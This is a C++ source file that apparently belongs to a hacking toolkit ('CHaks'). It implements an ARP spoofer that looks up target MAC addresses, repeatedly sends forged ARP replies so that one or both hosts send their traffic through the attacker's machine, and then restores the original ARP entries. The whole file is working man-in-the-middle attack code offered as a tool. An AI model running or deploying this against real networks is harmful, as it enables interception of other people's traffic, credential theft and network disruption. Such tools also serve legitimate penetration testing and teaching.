#include "ARPSpoofer.h"

#include <iostream>
#include <cstring>
#include <poll.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <arpa/inet.h> 
#include <sys/ioctl.h> 
#include <netinet/ether.h> 

CHaks::ARPSpoofer::ARPSpoofer()
{

}

CHaks::ARPSpoofer::~ARPSpoofer()
{

}

int CHaks::ARPSpoofer::GetTargetMACAddr(const int socketFd, const char* interfaceName, const char* srcIPStr, const char* srcMACStr, 
    const char* targetIPStr, char* targetMACStr)
{
    sockaddr_in targetIP{};
    if(inet_pton(AF_INET, targetIPStr, &targetIP.sin_addr) == -1)
    {
        LOG_ERROR(APPLICATION_ERROR, "inet_pton() error");
        return APPLICATION_ERROR;
    }

    ether_addr targetMAC{};
    if(PacketCraft::GetTargetMACAddr(socketFd, interfaceName, targetIP, targetMAC, 10'000) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "GetTargetMACAddr() error");
        return APPLICATION_ERROR;
    }

    if(ether_ntoa_r(&targetMAC, targetMACStr) == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "ether_ntoa_r() error");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::Spoof(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::ARPPacket arpPacket;
    if(arpPacket.Create(yourMAC, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    std::cout << "sending ARP packet to " << target1MACStr << " (" << target1IPStr << "): " << yourMAC 
    << " is at " << target2IPStr << " (press enter key to stop)" << "\n";

    if(spoofBoth == TRUE)
    {
        if(arpPacket.Create(yourMAC, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
            return APPLICATION_ERROR;
        }

        std::cout 
            << "sending ARP packet to " << target2MACStr << " (" << target2IPStr << "): " << yourMAC 
            << " is at " << target1IPStr << " (press enter key to stop)" << "\n";
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::SpoofLoop(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    pollfd pollFds[1]{};
    pollFds[0].fd = 0;      
    pollFds[0].events = POLLIN;

    std::cout << "\nSpoofing...press enter to stop\n\n";

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), ARP_SPOOF_FREQUENCY_MS);
        if(nEvents == -1)
        {
            LOG_ERROR(APPLICATION_ERROR, "poll() error!");
            return APPLICATION_ERROR;
        }
        else if(nEvents == 0)
        {
            if(Spoof(socketFd, interfaceName, yourIP, yourMAC, target1IPStr, target1MACStr, target2IPStr, target2MACStr, spoofBoth) == APPLICATION_ERROR)
            {
                LOG_ERROR(APPLICATION_ERROR, "Spoof() error!");
                return APPLICATION_ERROR;
            }
        }
        else
        {
            if(pollFds[0].revents & POLLIN)
            {
                std::cout << "stopping..." << std::endl;
                break;
            }
        }
    }

    return NO_ERROR;
}

int CHaks::ARPSpoofer::RestoreTargets(const int socketFd, const char* interfaceName, const char* yourIP, const char* yourMAC, 
    const char* target1IPStr, const char* target1MACStr, const char* target2IPStr, const char* target2MACStr, const bool32 spoofBoth)
{
    PacketCraft::ARPPacket arpPacket;
    if(arpPacket.Create(target2MACStr, target1MACStr, target2IPStr, target1IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
        return APPLICATION_ERROR;
    }

    if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
        return APPLICATION_ERROR;
    }

    if(spoofBoth == TRUE)
    {
        if(arpPacket.Create(target1MACStr, target2MACStr, target1IPStr, target2IPStr, ARPType::ARP_REPLY) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Create() error!");
            return APPLICATION_ERROR;
        }

        if(arpPacket.Send(socketFd, interfaceName) == APPLICATION_ERROR)
        {
            LOG_ERROR(APPLICATION_ERROR, "ARPPacket::Send() error!");
            return APPLICATION_ERROR;
        }
    }

    return NO_ERROR;
}

